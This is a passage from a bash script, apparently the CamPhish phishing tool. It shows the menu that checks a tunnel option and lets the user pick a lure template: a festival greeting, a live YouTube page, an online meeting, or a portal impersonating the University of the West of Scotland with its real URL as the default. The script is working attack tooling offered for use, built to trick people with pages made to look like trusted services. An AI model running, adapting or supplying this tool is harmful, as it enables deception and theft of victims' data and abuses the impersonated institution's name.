if [ $option_server -gt 3 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
camphish
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m UWS Portal\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
printf ""
elif [[ $option_tem -eq 4 ]]; then
uws_site_url="https://www.uws.ac.uk/"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter UWS site URL [Default: https://www.uws.ac.uk/]: \e[0m' uws_site_input
uws_site_url="${uws_site_input:-$uws_site_url}"
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

banner
dependencies
camphish
